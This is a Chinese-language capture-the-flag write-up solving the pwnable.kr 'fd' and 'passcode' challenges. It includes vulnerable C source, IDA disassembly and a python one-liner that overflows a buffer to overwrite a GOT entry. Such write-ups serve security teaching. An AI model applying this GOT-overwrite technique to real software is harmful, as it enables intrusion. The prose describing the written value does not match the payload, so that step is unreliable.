# Pwnable.kr


# pwnable.kr writeup

## 1 fd
文件描述符(file descricptor)
>维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。

习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2.
```c
//fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
```
得到flag的关键在于如歌通过第二个if语句, 也就是如何让buf=LETMEMIN
可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了.
注意到fd在此处赋值:
```c
int fd = atoi( argv[1] ) - 0x1234;
```
其中atoi是将字符串转化为整数的函数
```c
int main(int argc, char* argv[], char* envp[]){
```
可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到.

例如运行程序fd
```
./fd 4660
```
此时argc值为2, 而argv[0] = "./fd", argv[1] = "4660"

atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660
这样我们就可以让fd = 0, 程序等待从stdin中读取字符
我们再向命令行中输入LETMEWIN, 即可得到flag
## 2 collision


## 5 passcode
```c
#include <stdio.h>

#include <stdlib.h>

  

void login(){

        int passcode1;

        int passcode2;

  

        printf("enter passcode1 : ");

        scanf("%d", passcode1);

        fflush(stdin);

  

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)

        printf("enter passcode2 : ");

        scanf("%d", passcode2);

  

        printf("checking...\n");

        if(passcode1==338150 && passcode2==13371337){

                printf("Login OK!\n");

                system("/bin/cat flag");

        }

        else{

                printf("Login Failed!\n");

                exit(0);

        }

}

  

void welcome(){

        char name[100];

        printf("enter you name : ");

        scanf("%100s", name);

        printf("Welcome %s!\n", name);

}

  

int main(){

        printf("Toddler's Secure Login System 1.0 beta.\n");

  

        welcome();

        login();

  

        // something after login...

        printf("Now I can safely trust you that you have credential :)\n");

        return 0;

}
```
容易注意到login函数中这句 
```c
scanf("%d", passcode1);
```
本应该为
```c
scanf("%d", &passcode1);
```
也就是说scanf本该向passcode1所在地址写入内容, 却变成了将passcode1中存入的数作为地址, 向其写入内容. 这给了我们可乘之机, 如果能够覆盖passcode1的内容, 就可以向这个地址写入内容. 
那么如何修改passcode1呢? 自然我们要看在其之前执行的welcome函数, 它读入了100个字符. 
用IDA反编译一下 
```c
int login()
{
  int v1; // [esp+18h] [ebp-10h]
  int v2; // [esp+1Ch] [ebp-Ch]

  printf("enter passcode1 : ");
  __isoc99_scanf("%d", v1);
  fflush(stdin);
  printf("enter passcode2 : ");
  __isoc99_scanf("%d", v2);
  puts("checking...");
  if ( v1 != 338150 || v2 != 13371337 )
  {
    puts("Login Failed!");
    exit(0);
  }
  puts("Login OK!");
  return system("/bin/cat flag");
}

unsigned int welcome()
{
  char v1[100]; // [esp+18h] [ebp-70h] BYREF
  unsigned int v2; // [esp+7Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("enter you name : ");
  __isoc99_scanf("%100s", v1);
  printf("Welcome %s!\n", v1);
  return __readgsdword(0x14u) ^ v2;
}
```
由于welcome和login紧挨着先后执行, 那么代表栈底的ebp应该没有改变. login中的v1即passcode1在ebp-10h的位置, welcome中的v1即name在ebp-70h的位置, 70h-10h = 60h = 96. 也就是他们位置相差96字节, 而我们可以输入100个字节, 这多出的4个字节就正好可以覆盖passcode1. 如果把passcode1覆盖成printf函数的GOT,再在scanf向passcode1内的地址, 即我们覆盖的printf的GOT写入时输入system的GOT, 就可以将即将执行的printf变成system("/bin/cat flag")这个指令了.
在IDA里找到他们: 
```text
.plt:08048420
.plt:08048420 ; =============== S U B R O U T I N E =======================================
.plt:08048420
.plt:08048420 ; Attributes: thunk
.plt:08048420
.plt:08048420 ; int printf(const char *format, ...)
.plt:08048420 _printf         proc near               ; CODE XREF: login+E↓p
.plt:08048420                                         ; login+3C↓p ...
.plt:08048420
.plt:08048420 format          = dword ptr  4
.plt:08048420
.plt:08048420                 jmp     ds:off_804A000
.plt:08048420 _printf         endp
.plt:08048420
```
```text
.plt:08048460 ; =============== S U B R O U T I N E =======================================
.plt:08048460
.plt:08048460 ; Attributes: thunk
.plt:08048460
.plt:08048460 ; int system(const char *command)
.plt:08048460 _system         proc near               ; CODE XREF: login+86↓p
.plt:08048460
.plt:08048460 command         = dword ptr  4
.plt:08048460
.plt:08048460                 jmp     ds:off_804A010
.plt:08048460 _system         endp
.plt:08048460
```
### 实现:
```python
python -c 'print "A"*96+"\x00\xa0\x04\x08"+"134514147\n"' | ./passcode

```

